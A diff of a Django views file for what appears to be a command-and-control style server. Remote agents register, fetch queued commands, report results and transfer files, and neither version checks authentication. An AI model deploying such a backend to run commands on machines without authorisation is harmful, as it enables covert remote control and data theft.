@@ -1,83 +1,59 @@
-from django.shortcuts import render
-from django.http import JsonResponse, FileResponse
-from django.views.decorators.csrf import csrf_exempt
-from .models import *
-import json
-import uuid
-
-def home(request):
-    return render(request,'home.html')
-
-def agents(request):
-    return render(request,'agents.html')
-
-@csrf_exempt
-def register_agent(request):
-    if request.method == 'POST':
-        data = json.loads(request.body)
-        agent_id = str(uuid.uuid4())
-        agent = Agent.objects.create(agent_id=agent_id, ip_address=request.META['REMOTE_ADDR'])
-        return JsonResponse({'agent_id': agent.agent_id})
-
-@csrf_exempt
-def get_command(request, agent_id):
-    try:
-        agent = Agent.objects.get(agent_id=agent_id)
-        command = Command.objects.filter(agent=agent, executed=False).first()
-        if command:
-            action = command.command_text
-            file_id = None
-
-            uploaded_file = UploadedFile.objects.filter(agent=agent).first()
-            if uploaded_file:
-                file_id = uploaded_file.id
-
-            return JsonResponse({
-                'action': action,
-                'command_id': command.id,
-                'file_id': file_id
-            })
-        else:
-            return JsonResponse({'action': None, 'command_id': None, 'file_id': None})
-    except Agent.DoesNotExist:
-        return JsonResponse({'error': 'Agent not found'}, status=404)
-
-@csrf_exempt
-def report_result(request, agent_id):
-    if request.method == 'POST':
-        try:
-            agent = Agent.objects.get(agent_id=agent_id)
-            data = json.loads(request.body)
-            command = Command.objects.get(id=data['command_id'])
-            command.result = data['result']
-            command.executed = True
-            command.save()
-            return JsonResponse({'status': 'ok'})
-        except (Agent.DoesNotExist, Command.DoesNotExist):
-            return JsonResponse({'error': 'Not found'}, status=404)
+from rest_framework import viewsets, status
+from rest_framework.response import Response
+from rest_framework.decorators import action
+from .models import Agent, Command, FileTransfer
+from .serializers import AgentSerializer, CommandSerializer, FileTransferSerializer
 
 
-@csrf_exempt
-def file_transfer(request, agent_id, file_name=None):
-    try:
-        agent = Agent.objects.get(agent_id=agent_id)
+class AgentViewSet(viewsets.ModelViewSet):
+    queryset = Agent.objects.all()
+    serializer_class = AgentSerializer
 
-        # Handle file download
-        if request.method == 'GET' and file_name:
-            file_transfer = UploadedFile.objects.get(agent=agent, file__contains=file_name)
-            return FileResponse(file_transfer.file, as_attachment=True, filename=file_name)
+    @action(detail=True, methods=['post'])
+    def add_command(self, request, pk=None):
+        agent = self.get_object()
+        command_text = request.data.get('command_text')
+        command = Command.objects.create(agent=agent, command_text=command_text)
+        return Response(CommandSerializer(command).data)
 
-        # Handle file upload
-        elif request.method == 'POST':
-            if 'file' in request.FILES:
-                uploaded_file = request.FILES['file']
-                UploadedFile.objects.create(agent=agent, file=uploaded_file)
-                return JsonResponse({'status': 'File uploaded successfully'})
-            return JsonResponse({'error': 'No file provided'}, status=400)
+    @action(detail=True, methods=['get'])
+    def commands(self, request, pk=None):
+        agent = self.get_object()
+        commands = agent.commands.all()
+        return Response(CommandSerializer(commands, many=True).data)
 
-    except Agent.DoesNotExist:
-        return JsonResponse({'error': 'Agent not found'}, status=404)
-    except UploadedFile.DoesNotExist:
-        return JsonResponse({'error': 'File not found'}, status=404)
+    @action(detail=True, methods=['post'])
+    def assign_file(self, request, pk=None):
+        agent = self.get_object()
+        file = request.FILES.get('file')
+        if not file:
+            return Response({"error": "No file provided"}, status=status.HTTP_400_BAD_REQUEST)
 
-    return JsonResponse({'error': 'Invalid request method or parameters'}, status=400)
+        file_transfer = FileTransfer.objects.create(
+            agent=agent,
+            file=file,
+            file_name=file.name,
+            direction='download'
+        )
+        return Response(FileTransferSerializer(file_transfer).data, status=status.HTTP_201_CREATED)
+
+    @action(detail=True, methods=['get'])
+    def pending_files(self, request, pk=None):
+        agent = self.get_object()
+        files = agent.file_transfers.filter(direction='download', status='pending')
+        return Response(FileTransferSerializer(files, many=True).data)
+
+
+class FileTransferViewSet(viewsets.ModelViewSet):
+    queryset = FileTransfer.objects.all()
+    serializer_class = FileTransferSerializer
+
+    def create(self, request, *args, **kwargs):
+        agent_id = request.data.get('agent')
+        direction = request.data.get('direction')
+        file = request.FILES.get('file')
+
+        agent = Agent.objects.get(pk=agent_id)
+        file_transfer = FileTransfer.objects.create(agent=agent, direction=direction, file=file, file_name=file.name)
+
+        return Response(FileTransferSerializer(file_transfer).data, status=status.HTTP_201_CREATED)
